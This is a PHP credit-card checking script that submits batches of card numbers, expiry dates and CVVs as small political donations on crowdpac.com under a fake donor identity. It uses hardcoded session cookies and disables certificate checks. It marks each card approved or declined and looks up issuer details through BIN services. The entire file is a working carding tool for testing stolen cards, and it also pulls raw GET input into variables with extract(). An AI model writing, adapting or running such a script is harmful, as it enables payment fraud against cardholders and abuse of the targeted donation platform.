<?php

set_time_limit(0);
error_reporting(0);

//date_default_timezone_set('America/Sao_Paulo');
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

$headers1 = array("Host: www.crowdpac.com","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","Accept-Encoding: gzip, deflate","Referer: https://www.crowdpac.com/campaigns/386225/andr-s-cano","Cookie: _ga=GA1.2.984337676.1537677819; _gid=GA1.2.1904106532.1537677819; remember_82e5d2c56bdd0811318f0cf078b78bfc=eyJpdiI6IjlMbVVEYThUbUh1R1pXQUFxT01IZVR5b3VpXC95QTl4K3F0VHozMWQ3cytZPSIsInZhbHVlIjoieHNxMVJhMUR2Mnp1ejdOMTFJXC9xM1c4SjdBK0VnTGVoQVwvWjNMaG1aR2s4ZmZxaDY5VG42VUg3U21aSVYyTXZpWkFWV2dYM3JnSHUwRmxScEowVUNGMVwvbFY0Z3VOTmVxXC81MTNPSTg3V1dSXC9EcGJQZHJxRDVQVVJUVUJUN0Z6SiIsIm1hYyI6ImYyYTMzZThiNmQ0OTM2NTUzOWE4NDQxOTUwMjc3ODhkM2EyNjgzZGFhMGY3ZTdlZDQ5OTA3Y2MwMGI5YWFjZDYifQ%3D%3D; cpsssp=eyJpdiI6IlwvRXNmcmZ2Tmg1REpcL3RKODBuYXJaMStDUmZIS2txcDlQZ3JFaDhOTStzUT0iLCJ2YWx1ZSI6Im9CMUoxMTZiVkJaMHpPcjFiZ0dSNDc5b1Z4R0YwTTdjUnV4VHhVSk8zTFZMdE00dCtlY2wyS1kxbU5pcWc5WVRlSEFCMGVUNjhEK0RWYlBXamRDNDVBPT0iLCJtYWMiOiI0ZmQ3OTQ1NDU3ZWNhY2ZhNGU5ZDU2YjY5NmFlNTU4OGQ3ZDg1NDA5OWYyMmY1YTRjNzcxYjRkYTBhM2NlM2YyIn0%3D; mp_d6860d32144490886f5236e3964a0639_mixpanel=%7B%22distinct_id%22%3A%20%2216604bd7de6c5-04ed6832543dc6-38694646-d3ad0-16604bd7de89e8%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D","Connection: close","Upgrade-Insecure-Requests: 1");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.crowdpac.com/contribute/386225?amount=3');
curl_setopt($ch, CURLOPT_HEADER, $headers1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($ch);

$token = trim(strip_tags(getstr($result,'name="_token" type="hidden" value="','"')));
//echo $token; exit();
$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

$headers2 = array("Host: www.crowdpac.com","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0","Accept: */*","Accept-Language: en-US,en;q=0.5","Accept-Encoding: gzip, deflate","Referer: https://www.crowdpac.com/contribute/386225?amount=3","Content-Type: application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With: XMLHttpRequest","Content-Length: 1243","Connection: close");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.crowdpac.com/apiv2/contribution/contribute/crowdpac/386225');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_token='.$token.'&redirect_to_return_url=0&is_pledge=0&undeclared_candidate=1&amount=%2425.00&tip_amount=2.5&fees_amount=1.32&fee_percentage=0.0375&fee_additional=30&show_tip_jar=1&show_fees=1&crowdpac_fee_additional_percentage=&amounts=%7B%22candidates%22%3A%7B%225b1a11e114209317d919d97f%22%3A%22%2425.00%22%7D%2C%22organizations%22%3A%7B%7D%7D&has_contribution_limit=1&min_individual=1&max_individual=5100&max_couple=10200&can_couple_donate=1&mode=crowdpac&source_code=&ref_code=&utm_source=&utm_medium=&utm_campaign=&utm_term=&utm_content=&crowdpac_id=386225&employer_address_required=0&donate-other-couple=&candidate_amount%5B5b1a11e114209317d919d97f%5D=%2425.00&name=Sergio+Soto&email=sergiosoto%40gmail.com&public=1&address=Street+1234&city=Andover&state=MA&zip=10055&employer=Retired&occupation=Retired&retired=Retired&is_couple=0&spouse1_name=&spouse1_email=&couple_public=1&spouse1_employer=&spouse1_occupation=&spouse2_name=&spouse2_email=&spouse2_employer=&spouse2_occupation=&payment_method=credit_card&cc_number='. $number1 . $number2 . $number3 . $number4 .'&cc_verification_value='. $cvv .'&cc_month=' . $mes . '&cc_year='. $ano .'&ach_account_type=checking&ach_account_number=&ach_routing_number=&email_on_update=0&accept_contribution_rules=1');


$pagamento = curl_exec($ch);
//echo $pagamento; exit();

if (strpos($pagamento, 'There was a problem processing your contribution. Please verify your payment details are correct and try again')) { 

	echo '<span class="label label-danger">#Reprovada ❌ '.$lista.' #nic0la 7esla<br></span>';

}

 else {

$bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);



$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
 echo '<span class="label label-success">#Aprovada ✅ '.$lista.' #nic0la 7esla | Informacion | BIN: '.$binn.'</span> <br>';
  }

curl_close($ch);
ob_flush();

?>